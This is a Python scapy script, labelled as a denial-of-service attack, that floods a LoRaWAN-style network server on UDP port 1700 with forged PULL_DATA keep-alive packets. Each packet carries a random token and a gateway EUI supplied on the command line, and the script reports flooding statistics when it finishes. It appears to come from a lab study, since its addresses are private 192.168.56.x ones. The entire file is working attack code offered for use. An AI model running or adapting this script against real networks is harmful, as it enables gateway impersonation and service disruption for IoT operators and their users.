#Denial of Service Attack Script that sends mutiple PULL_DATA headers to the Network Server 

import sys
import time
import random
from scapy.all import *

# Define the destination address and port

src_addr = '192.168.56.102'
src_port = 56300
dest_addr = '192.168.56.104'
dest_port = 1700

# Define the PULL_DATA packet identifier
identifier = '02'

# Get the Gateway EUI from the command line
gateway_eui = sys.argv[2]

num_times = int(sys.argv[1])

# Get the start time
start_time = time.time()

# Send the packet to the destination IP address and port the specified number of times
for i in range(num_times):
    # Generate a random token for each packet
    random_token = "{:04x}".format(random.randint(0, 65535))

    # Create the payload for each packet
    payloadx = identifier + random_token + identifier + gateway_eui

    # Convert the payload to binary format using the bytes.fromhex() method
    payload = bytes.fromhex(payloadx)

    # Define the IP and UDP headers
    ip = IP(src=src_addr, dst=dest_addr)
    udp = UDP(sport=src_port, dport=dest_port)

    # Construct the packet by combining the headers and payload
    packet = ip / udp / payload

    send(packet) 
    time.sleep(0.5)

# Get the end time
end_time = time.time()

# Calculate the total execution time
execution_time = end_time - start_time

# Calculate the transmission rate
transmission_rate = round(num_times / execution_time, 1)

print("Keep Alive Flooding Statistics")
print(f"Packets sent: {num_times}")
print(f"Start time: {time.ctime(start_time)}")
print(f"End time: {time.ctime(end_time)}")
print(f"Total execution time: {execution_time} seconds")
print(f"Transmission rate: {transmission_rate} packets per second")
